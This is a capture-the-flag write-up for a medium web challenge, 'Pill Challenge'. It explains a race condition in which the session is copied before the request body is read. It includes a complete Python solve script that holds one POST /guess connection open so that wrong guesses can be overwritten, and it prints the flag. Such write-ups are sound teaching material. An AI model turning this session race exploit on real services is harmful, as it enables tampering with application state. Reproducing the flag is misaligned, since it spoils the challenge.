# Web - Pill Challenge
**Author**: jvvan  
**Difficulty**: Medium  
**Description**: You got captured by a criminal mastermind, can you earn your freedom back?  

**Flag**: `SCC{r3m3mb3r_70_h4ndl3_y0ur_r4c3_c0nd1t10ns}`

# Writeup

We are given a website with 2 buttons and we have to correctly guess the correct button 100 times in a row.
Obviously, we can't brute force this, so we need to find another way.

All of the code related to saving and getting sessions is safe. However, there is a race condition with how we are mixing sessions and getBody() function.

Race conditions exists because we are getting a copy of the session after headers are read, but before the body is read.
This means that we can:
1. Open a http connection and do POST /guess (don't send the body yet)
2. Open a second http connection and do POST /guess and send a guess e.g. `blue`
3. If the guess is correct, we can just close the first connection and we guessed correctly.
4. If the guess is incorrect, we can send `red` to the first connection overwriting the session.

We can just repeat this process 100 times until we get the flag.

Solve script: 

```python
#!/usr/bin/env python3
import http.client

chall_host = "localhost"
chall_port = 3000


def start():
    conn = http.client.HTTPConnection(chall_host, chall_port)
    conn.request("POST", "/start")
    res = conn.getresponse()
    return res.getheader("x-session-id")


def round(session_id):
    redConn = http.client.HTTPConnection(chall_host, chall_port)
    redConn.connect()
    redConn.putrequest("POST", "/guess")
    redConn.putheader("x-session-id", session_id)
    redConn.putheader("Content-Type", "text/plain")
    redConn.putheader("Content-Length", len("red"))
    redConn.endheaders()

    blueConn = http.client.HTTPConnection(chall_host, chall_port)
    blueConn.request(
        "POST",
        "/guess",
        "blue",
        headers={"Content-Type": "text/plain", "x-session-id": session_id},
    )

    blueResponse = blueConn.getresponse()
    blueResult = blueResponse.read().decode()

    if blueResult == "Correct":
        redConn.close()
        return "blue"
    else:
        redConn.send(b"red")
        redConn.close()
        return "red"


def status(session_id):
    conn = http.client.HTTPConnection(chall_host, chall_port)
    conn.request("GET", "/status", headers={"x-session-id": session_id})
    res = conn.getresponse()
    return res.read().decode()


session_id = start()
for i in range(1, 101):
    current = round(session_id)
    print("Round", i, ":", current, "->", status(session_id))
```